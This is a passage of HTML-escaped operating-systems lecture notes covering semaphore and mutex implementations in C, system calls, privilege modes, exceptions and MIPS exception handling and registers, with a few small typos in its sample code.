&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// lock wait channel operations
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// prevents a race between sleep and wakeone
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;wchan_lock&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; wchan *wc);
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// wait
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;P&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; semaphore *sem) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;spinlock_acquire&lt;/span&gt;(&amp;amp;sem-&amp;gt;sem_lock);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt; (sem-&amp;gt;sem_count == &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;wchan_lock&lt;/span&gt;(sem-&amp;gt;sem_wchan);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;spinlock_release_&lt;/span&gt;(&amp;amp;sem-&amp;gt;sem_lock);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;wchan_sleep&lt;/span&gt;(sem-&amp;gt;sem_wchan);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;spinlock_acquire&lt;/span&gt;(&amp;amp;sem-&amp;gt;sem_lock);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  sem-&amp;gt;sem_count--;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;spinlock_release&lt;/span&gt;(&amp;amp;sem-&amp;gt;sem_lock);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;// signal
&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#999;font-style:italic&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#447fcf&#34;&gt;V&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; semaphore *sem) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;spinlock_acquire&lt;/span&gt;(&amp;amp;sem-&amp;gt;sem_lock)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  sem-&amp;gt;count++;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;wchan_wakeone&lt;/span&gt;(sem-&amp;gt;sem_wchan);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;spinlock_release&lt;/span&gt;(&amp;amp;sem-&amp;gt;sem_lock);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;details&gt;&lt;summary&gt;Mutex Lock Implementation&lt;/summary&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; lock {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; wchan *wc;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; spinlock lock;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;int&lt;/span&gt; state;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;lock_acquire&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; lock *l) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;spinlock_acquire&lt;/span&gt;(&amp;amp;l-&amp;gt;lock);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;while&lt;/span&gt;(l-&amp;gt;state) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;wchan_lock&lt;/span&gt;(l-&amp;gt;wc);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;spinlock_release&lt;/span&gt;(l-&amp;gt;lock);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;wchan_sleep&lt;/span&gt;(l-&amp;gt;wc);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#447fcf&#34;&gt;spinlock_acquire&lt;/span&gt;(l-&amp;gt;lock);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  l-&amp;gt;state = &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;spinlock_release&lt;/span&gt;(&amp;amp;l-&amp;gt;lock);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#447fcf&#34;&gt;lock_release&lt;/span&gt;(&lt;span style=&#34;color:#6ab825;font-weight:bold&#34;&gt;struct&lt;/span&gt; lock *l) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;spinlock_acquire&lt;/span&gt;(&amp;amp;l-&amp;gt;lock);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  l-&amp;gt;state = &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;wchan_wakeone&lt;/span&gt;(l-&amp;gt;wc);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;  &lt;span style=&#34;color:#447fcf&#34;&gt;spinlock_release&lt;/span&gt;(&amp;amp;l-&amp;gt;lock);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;}
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/details&gt;
&lt;h2 id=&#34;system-calls&#34; &gt;System Calls
&lt;span&gt;
    &lt;a href=&#34;#system-calls&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h2&gt;&lt;p&gt;System Calls: Application programmer interface (API) that
programmers use to interact with the operating system. They are also a class of exceptions.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Unprivileged code&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Application&lt;/li&gt;
&lt;li&gt;Syscall Library&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Privileged&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Kernel&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;sysctl(): Exposes operating system configuration&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;ioctl(): Controlling devices&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;privilege-modes&#34; &gt;Privilege Modes
&lt;span&gt;
    &lt;a href=&#34;#privilege-modes&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Kernel / Privileged Mode - Operating System
&lt;ul&gt;
&lt;li&gt;Access all privileged CPU features&lt;/li&gt;
&lt;li&gt;Setup and mange interrupts&lt;/li&gt;
&lt;li&gt;Controls the system call interface&lt;/li&gt;
&lt;li&gt;Modify the TLB (virtual memory &amp;hellip; future lecture)&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;User Mode - Applications
&lt;ul&gt;
&lt;li&gt;Cannot read/write kernel memory&lt;/li&gt;
&lt;li&gt;Cannot directly call kernel functions&lt;/li&gt;
&lt;li&gt;System library is also kernel memory so library is secure&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;mode-transitions&#34; &gt;Mode Transitions
&lt;span&gt;
    &lt;a href=&#34;#mode-transitions&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;p&gt;Kernel Mode can only be entered through well defined entry points.&lt;/p&gt;
&lt;h4 id=&#34;interrupts&#34; &gt;Interrupts
&lt;span&gt;
    &lt;a href=&#34;#interrupts&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Generated by external devices needing to signal&lt;/li&gt;
&lt;li&gt;Signal processor through pin or bus message&lt;/li&gt;
&lt;li&gt;Processor executes interrupt handler and preempts running program&lt;/li&gt;
&lt;li&gt;Non-maskable interrupts (NMI) are urgent system requests that cannot be disabled&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;exceptions&#34; &gt;Exceptions
&lt;span&gt;
    &lt;a href=&#34;#exceptions&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;Caused by processor. E.g. divide by zero, page faults, CPU errors&lt;/li&gt;
&lt;li&gt;Also called faults&lt;/li&gt;
&lt;li&gt;Program errors: Divide-by-zero, illegal instructions&lt;/li&gt;
&lt;li&gt;Operating System Requests: Page Faults&lt;/li&gt;
&lt;li&gt;Hardware Errors: System check (bad memory or CPU failures)&lt;/li&gt;
&lt;li&gt;CPU stops at instruction that triggered the exception&lt;/li&gt;
&lt;li&gt;Control is transferred to a fixed location where the exception handler is located in privledged mode&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;mips-exception-vectors&#34; &gt;MIPS Exception Vectors
&lt;span&gt;
    &lt;a href=&#34;#mips-exception-vectors&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;p&gt;interrupt (0), system call (8), or other exception&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EX_IRQ &lt;span style=&#34;color:#3677a9&#34;&gt;0&lt;/span&gt; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* Interrupt */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EX_MOD &lt;span style=&#34;color:#3677a9&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* TLB Modify (write to read-only page) */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EX_TLBL &lt;span style=&#34;color:#3677a9&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* TLB miss on load */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EX_TLBS &lt;span style=&#34;color:#3677a9&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* TLB miss on store */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EX_ADEL &lt;span style=&#34;color:#3677a9&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* Address error on load */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EX_ADES &lt;span style=&#34;color:#3677a9&#34;&gt;5&lt;/span&gt; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* Address error on store */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EX_IBE &lt;span style=&#34;color:#3677a9&#34;&gt;6&lt;/span&gt; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* Bus error on instruction fetch */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EX_DBE &lt;span style=&#34;color:#3677a9&#34;&gt;7&lt;/span&gt; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* Bus error on data load or store */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EX_SYS &lt;span style=&#34;color:#3677a9&#34;&gt;8&lt;/span&gt; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* Syscall */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EX_BP &lt;span style=&#34;color:#3677a9&#34;&gt;9&lt;/span&gt; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* Breakpoint */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EX_RI &lt;span style=&#34;color:#3677a9&#34;&gt;10&lt;/span&gt; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* Illegal instruction */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EX_CPU &lt;span style=&#34;color:#3677a9&#34;&gt;11&lt;/span&gt; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* Coprocessor unusable */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;EX_OVF &lt;span style=&#34;color:#3677a9&#34;&gt;12&lt;/span&gt; &lt;span style=&#34;color:#999;font-style:italic&#34;&gt;/* Arithmetic overflow */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;system-call-handling&#34; &gt;System Call Handling
&lt;span&gt;
    &lt;a href=&#34;#system-call-handling&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;EX_SYS (8) exception&lt;/li&gt;
&lt;/ul&gt;
&lt;ol&gt;
&lt;li&gt;Application loads the arguments into CPU registers&lt;/li&gt;
&lt;li&gt;Load the system call number into register $v0&lt;/li&gt;
&lt;li&gt;Executes syscall instruction to trigger EX_SYS exception&lt;/li&gt;
&lt;li&gt;Kernel processes the system call through the exception handler&lt;/li&gt;
&lt;/ol&gt;
&lt;ul&gt;
&lt;li&gt;kernel stack&lt;/li&gt;
&lt;li&gt;create trapframe of the program state&lt;/li&gt;
&lt;li&gt;exception type&lt;/li&gt;
&lt;li&gt;type of system call&lt;/li&gt;
&lt;li&gt;run kernel function&lt;/li&gt;
&lt;li&gt;restore state from trapframe&lt;/li&gt;
&lt;/ul&gt;
&lt;ol start=&#34;5&#34;&gt;
&lt;li&gt;Returns to userspace using rfe, return from exception instruction&lt;/li&gt;
&lt;/ol&gt;
&lt;h3 id=&#34;hardware-handling-in-mips-r3000&#34; &gt;Hardware Handling in MIPS R3000
&lt;span&gt;
    &lt;a href=&#34;#hardware-handling-in-mips-r3000&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;Fixed location exception handlers&lt;/li&gt;
&lt;li&gt;0x8000_00&lt;strong&gt;00&lt;/strong&gt; User TLB Handler (virtual memory)
&lt;ul&gt;
&lt;li&gt;So frequent, handler is hand optimized assembly&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;0x8000_00&lt;strong&gt;80&lt;/strong&gt; general exception handler&lt;/li&gt;
&lt;li&gt;First 512MB of memory is for the OS&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;mips-coprocessor&#34; &gt;MIPS Coprocessor
&lt;span&gt;
    &lt;a href=&#34;#mips-coprocessor&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;MIPS CP0: system control coprocessor
&lt;ul&gt;
&lt;li&gt;System Control Coprocessor (CP0) contains exception handling information&lt;/li&gt;
&lt;li&gt;c0_status&lt;/li&gt;
&lt;li&gt;c0_cause&lt;/li&gt;
&lt;li&gt;c0_epc&lt;/li&gt;
&lt;li&gt;c0_vaddr (fault associated address)&lt;/li&gt;
&lt;li&gt;c0_contex&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;MIPS CP1 floating point coprocessor&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;mips-review&#34; &gt;MIPS Review
&lt;span&gt;
    &lt;a href=&#34;#mips-review&#34;&gt;
        &lt;svg viewBox=&#34;0 0 28 23&#34; height=&#34;100%&#34; width=&#34;19&#34; xmlns=&#34;http://www.w3.org/2000/svg&#34;&gt;&lt;path d=&#34;M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;path d=&#34;M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71&#34; fill=&#34;none&#34; stroke-linecap=&#34;round&#34; stroke-miterlimit=&#34;10&#34; stroke-width=&#34;2&#34;/&gt;&lt;/svg&gt;
    &lt;/a&gt;
&lt;/span&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;caller-saved registers&lt;/li&gt;
&lt;li&gt;t0-t9: temporary registers&lt;/li&gt;
&lt;li&gt;a0-a3: argument registers&lt;/li&gt;
&lt;li&gt;v0-v1: return values&lt;/li&gt;
&lt;li&gt;s0-s7: callee-saved registers&lt;/li&gt;
&lt;li&gt;jal: jump and link to $ra&lt;/li&gt;
&lt;li&gt;jr $ra: return from function&lt;/li&gt;
&lt;li&gt;registers are saved per-thread stack (stacks are not shared, memories are&amp;hellip;)&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;application-binary-interface&#34; &gt;Application Binary Interface
&lt;span&gt;
